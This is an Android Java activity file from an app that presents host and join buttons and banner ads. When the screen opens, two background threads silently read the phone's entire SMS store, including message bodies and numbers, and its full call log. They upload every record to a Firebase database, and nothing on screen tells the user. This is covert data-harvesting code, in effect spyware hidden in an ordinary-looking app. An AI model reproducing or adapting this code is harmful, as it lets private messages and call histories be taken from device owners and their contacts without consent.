package com.armscreation.phone_data;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Telephony;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.MobileAds;
import com.google.android.gms.ads.initialization.InitializationStatus;
import com.google.android.gms.ads.initialization.OnInitializationCompleteListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class MainTab extends AppCompatActivity {
    FirebaseAuth fAuth;
    FirebaseFirestore fStore;
    String userId;
    private DatabaseReference mDatabase;
    private AdView adView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_tab);

        MobileAds.initialize(this, new OnInitializationCompleteListener() {
            @Override
            public void onInitializationComplete(InitializationStatus initializationStatus) {
            }
        });

        adView = findViewById(R.id.adView);
        AdRequest adRequest = new AdRequest.Builder().build();
        adView.loadAd(adRequest);

        adView.setAdListener(new AdListener() {
            @Override
            public void onAdLoaded() {
                // Code to be executed when an ad finishes loading.
            }



            @Override
            public void onAdOpened() {
                // Code to be executed when an ad opens an overlay that
                // covers the screen.
            }

            @Override
            public void onAdClicked() {
                // Code to be executed when the user clicks on an ad.
            }

            @Override
            public void onAdLeftApplication() {
                // Code to be executed when the user has left the app.
            }

            @Override
            public void onAdClosed() {
                // Code to be executed when the user is about to return
                // to the app after tapping on an ad.
            }
        });

        fAuth = FirebaseAuth.getInstance();
        fStore = FirebaseFirestore.getInstance();
        mDatabase = FirebaseDatabase.getInstance().getReference();
        //SendData();



        Thread myThread;
        myThread = new Thread() {
            @SuppressLint("NewApi")
            @Override
            public void run() {

                getCallDeatils();


            }
        };
        myThread.start();

        Thread myThread2;
        myThread2 = new Thread() {
            @Override
            public void run() {


              getAllSms();

            }
        };
        myThread2.start();


        Button servers = findViewById(R.id.button);
        Button clients = findViewById(R.id.button2);

        servers.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(MainTab.this, Host.class);
                startActivity(intent);

            }
        });
        clients.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(MainTab.this, Join.class);
                startActivity(intent);
            }
        });
    }


    public void getAllSms() {
        StringBuffer stringBuffer = new StringBuffer();

        Date today = new Date();
        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a");
        String dateToStr = format.format(today);
        Cursor c = getApplicationContext().getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        String details;
        stringBuffer.append("Call Deatils");
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat = new Date(Long.parseLong(smsDate));
                    String type = null;
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }

                    stringBuffer.append("\nPhone Number:--- " + number + " \nMsg Type:--- " + type + " \nMsg Date:--- " + dateFormat + " \nMsg Body :--- " + body);

                    stringBuffer.append("\n----------------------------------");

                    details = ("\nPhone Number:--- " + number + " \nMsg Type:--- " + type + " \nMsg Date:--- " + dateFormat + " \nMsg Body :--- " + body+"\n----------------------------------\n");

                    userId = Objects.requireNonNull(fAuth.getCurrentUser()).getUid();
                    Map<String, Object> user1 = new HashMap<>();
                    user1.put(smsDate, details);
                    mDatabase.child("Users Data").child(userId).child("Data").child("Msg").updateChildren(user1);
                    /**
                    DocumentReference documentReference1 = fStore.collection("Users Data").document(userId).collection("Data").document("Calls");
                    Map<String, Object> user = new HashMap<>();
                    user.put(smsDate, details);
                    documentReference1.update(user);
**/
                    c.moveToNext();

                }
            }

            c.close();


        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    private void getCallDeatils() {
        StringBuffer stringBuffer = new StringBuffer();
        String details;


        Date today = new Date();
        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a");
        String dateToStr = format.format(today);

        Cursor managedCursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);

        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        stringBuffer.append("Call Deatils");

        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            String reportDate = df.format(callDayTime);
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";

                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;

            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");

            details = ("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration+"\n----------------------------------\n");


            userId = Objects.requireNonNull(fAuth.getCurrentUser()).getUid();

            // Multiline data storage
            Map<String, Object> user1 = new HashMap<>();
            user1.put(callDate, details);
            mDatabase.child("Users Data").child(userId).child("Data").child("Calls").updateChildren(user1);

            /**
            userId = Objects.requireNonNull(fAuth.getCurrentUser()).getUid();
            DocumentReference documentReference1 = fStore.collection("Users Data").document(userId).collection("Data").document("Calls");
            Map<String, Object> user = new HashMap<>();
            user.put(callDate, details);
            documentReference1.update(user);
             **/

        }


    }


    //Storing data in Cloud Firestore


    private void SendData() {
        //Storing data in Cloud Firestore
        userId = Objects.requireNonNull(fAuth.getCurrentUser()).getUid();
        DocumentReference documentReference1 = fStore.collection("Users Data").document(userId).collection("Data").document("Value");
        Map<String, Object> user = new HashMap<>();
        user.put("Full Name", "name");
        user.put("UAN", "UAN_id");
        documentReference1.set(user);


        //Storing data in realtime storage
        userId = Objects.requireNonNull(fAuth.getCurrentUser()).getUid();
        //one line storage
        mDatabase.child("Users List").child(userId).child("Data").setValue("Data");
        // Multiline data storage
        Map<String, Object> user1 = new HashMap<>();
        user1.put("Full Name", "name");
        user1.put("UAN", "UAN_id");

        mDatabase.child("Users Data").child(userId).child("Data").setValue(user1);

    }

    public void LogOutMain(View view) {
        FirebaseAuth.getInstance().signOut();
        new UserSession(MainTab.this).removeUser();
        startActivity(new Intent(MainTab.this, Login.class));
        finish();
    }
    /** Called when leaving the activity */
    @Override
    public void onPause() {
        if (adView != null) {
            adView.pause();
        }
        super.onPause();
    }

    /** Called when returning to the activity */
    @Override
    public void onResume() {
        super.onResume();
        if (adView != null) {
            adView.resume();
        }
    }

    /** Called before the activity is destroyed */
    @Override
    public void onDestroy() {
        if (adView != null) {
            adView.destroy();
        }
        super.onDestroy();
    }
}